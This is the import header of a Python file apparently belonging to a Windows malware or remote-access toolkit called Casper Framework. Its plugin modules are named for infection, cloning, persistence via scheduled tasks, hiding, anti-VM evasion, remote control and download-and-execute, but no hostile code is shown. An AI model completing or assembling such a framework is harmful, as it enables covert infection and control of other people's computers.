'''
Part of Casper Framework
'''
import os
import sys
import time
import socket
import random
import base64
import urllib
import shutil
import logging
import subprocess
from ctypes import *
from _winreg import *

# during development
logging.basicConfig(format="%(message)s",level=logging.DEBUG)

# Non standard modules
import wmi
import mss
import win32gui
import win32console

# Plugins and features
from clone import *
from infect import *
from schtasks import *
from hide import *
from antivm import *
from encoder import *
from control import *
from downexec import *
from removal import *
